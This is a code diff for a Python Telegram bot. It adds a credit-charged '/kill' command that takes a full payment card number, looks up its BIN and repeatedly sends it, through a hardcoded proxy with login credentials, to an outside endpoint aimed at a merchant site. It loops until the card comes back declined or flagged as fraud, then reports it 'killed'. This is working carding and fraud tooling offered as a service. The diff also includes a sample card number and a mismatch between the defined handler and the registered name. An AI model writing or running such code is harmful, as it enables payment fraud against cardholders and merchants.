@@ -2489,10 +2489,7 @@ async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
-
-
-
-
+            
 # --- Main /sh command ---
 import re
 import asyncio
@@ -2545,6 +2542,213 @@ async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # --- Run in background ---
     asyncio.create_task(process_st(update, context, payload))
+
+
+
+
+import aiohttp
+import asyncio
+import json
+import time
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from telegram.error import TelegramError
+from bin import get_bin_info
+from db import get_user, update_user
+
+KILL_API = (
+    "https://rockyog.onrender.com/index.php"
+    "?site=https://deltacloudz.com"
+    "&cc={full_card}"
+    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+)
+
+MAX_BAR_LENGTH = 8
+PROGRESS_CHAR = "█"
+COOLDOWN = 5  # 5 seconds cooldown
+user_cooldowns = {}  # user_id: timestamp
+
+
+# --- Consume credits ---
+async def consume_credit(user_id: int, amount: int = 1) -> bool:
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) >= amount:
+        new_credits = user_data["credits"] - amount
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+
+# --- /kill command handler ---
+async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    now = time.time()
+
+    # --- Check cooldown ---
+    last_used = user_cooldowns.get(user_id, 0)
+    if now - last_used < COOLDOWN:
+        await update.message.reply_text(
+            f"⏳ Please wait {int(COOLDOWN - (now - last_used))}s before using /kill again.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # --- Mark cooldown ---
+    user_cooldowns[user_id] = now
+
+    # --- Run the kill in background ---
+    asyncio.create_task(_kill_task(update, context, user_id))
+
+
+async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    try:
+        start_time = time.time()
+
+        # --- Get card ---
+        if context.args:
+            cc = context.args[0].strip()
+        elif update.message.reply_to_message and update.message.reply_to_message.text:
+            cc = update.message.reply_to_message.text.strip().split()[0]
+        else:
+            await update.message.reply_text(
+                "❌ Please provide a card.\nExample:\n<code>/kill 4023601038388807|01|29|166</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- BIN lookup ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "Unknown"
+            country_flag = bin_details.get("country_emoji", "")
+        except Exception:
+            brand = issuer = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- Unsupported cards ---
+        if brand.upper() == "AMEX":
+            await update.message.reply_text(
+                "⚠️ 𝐀𝐦𝐞𝐫𝐢𝐜𝐚𝐧 𝐄𝐱𝐩𝐫𝐞𝐬𝐬 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝!\n"
+                "❌ 𝙆𝙞𝙡𝙡 𝙤𝙣𝙡𝙮 𝙨𝙪𝙥𝙥𝙤𝙧𝙩𝙨 𝙑𝙞𝙨𝙖 𝙘𝙖𝙧𝙙𝙨.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        if brand.upper() == "MASTERCARD":
+            await update.message.reply_text(
+                "⚠️ 𝐌𝐚𝐬𝐭𝐞𝐫𝐜𝐚𝐫𝐝 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝!\n"
+                "❌ 𝙆𝙞𝙡𝙡 𝙤𝙣𝙡𝙮 𝙨𝙪𝙥𝙥𝙤𝙧𝙩𝙨 𝙑𝙞𝙨𝙖 𝙘𝙖𝙧𝙙𝙨",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Check user credits ---
+        user_data = await get_user(user_id)
+        if not user_data or user_data.get("credits", 0) < 5:
+            await update.message.reply_text(
+                "❌ You need at least 5 credits to use /kill.\nEarn more credits to proceed.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Initial progress message ---
+        msg = await update.message.reply_text(
+            "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
+            f"[{' ' * MAX_BAR_LENGTH}] 0%\n"
+            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+        api_url = KILL_API.format(full_card=cc)
+        final_status = None
+        display_response = ""
+        attempt = 0
+        max_attempts = 15
+
+        async with aiohttp.ClientSession() as session:
+            while attempt < max_attempts:
+                attempt += 1
+                percent = int((attempt / max_attempts) * 100)
+                bar_length = int((attempt / max_attempts) * MAX_BAR_LENGTH)
+                bar = PROGRESS_CHAR * bar_length + " " * (MAX_BAR_LENGTH - bar_length)
+
+                # --- Update progress ---
+                processing_text = (
+                    f"<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
+                    f"[{bar}] {percent}%\n"
+                    f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
+                )
+                try:
+                    await msg.edit_text(
+                        processing_text,
+                        parse_mode=ParseMode.HTML,
+                        disable_web_page_preview=True
+                    )
+                except TelegramError:
+                    pass
+
+                # --- Call API ---
+                try:
+                    async with session.get(api_url, timeout=55) as resp:
+                        data = await resp.json()
+                except Exception:
+                    await asyncio.sleep(3)
+                    continue
+
+                response = data.get("Response", "").upper()
+                if response in ("CARD_DECLINED", "FRAUD_SUSPECTED"):
+                    final_status = "✅ 𝗞𝗶𝗹𝗹𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
+                    display_response = "Your card has been killed successfully."
+
+                    # Deduct 5 credits on success
+                    await consume_credit(user_id, 5)
+                    break
+
+                await asyncio.sleep(3)
+
+            if not final_status:
+                final_status = "❌ FAILED / TIMEOUT"
+                display_response = "The card could not be killed."
+
+        elapsed_time = round(time.time() - start_time, 1)
+        escaped_card = escape(cc[:6] + "******" + cc[-4:])
+        remaining_credits = (await get_user(user_id)).get("credits", 0)
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+        # --- Final stylish text ---
+        final_text = (
+            f"<b><i>{final_status}</i></b>\n\n"
+            f"𝐂𝐚𝐫𝐝\n"
+            f"⤷ <code>{escaped_card}</code>\n"
+            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
+            f"<pre>"
+            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
+            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
+            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
+            f"</pre>\n\n"
+            f"𝐂𝐫𝐞𝐝𝐢𝐭𝐬 ➵ {remaining_credits}\n"
+            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
+            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
+        )
+
+        await msg.edit_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+
+    except Exception as e:
+        await update.message.reply_text(
+            "❌ Unexpected error while processing /kill.",
+            parse_mode=ParseMode.HTML
+        )
+        print(f"[ERROR] /kill task failed: {e}")
+
 
 
 
@@ -8784,6 +8988,7 @@ def register_user_commands(application):
         ("open", open_command),
         ("dork", dork),
         ("adserp", adserp), 
+        ("killer", killer), 
         ("rserp", rserp),
         ("adcr", adcr_command),
         ("ad", ad_command),
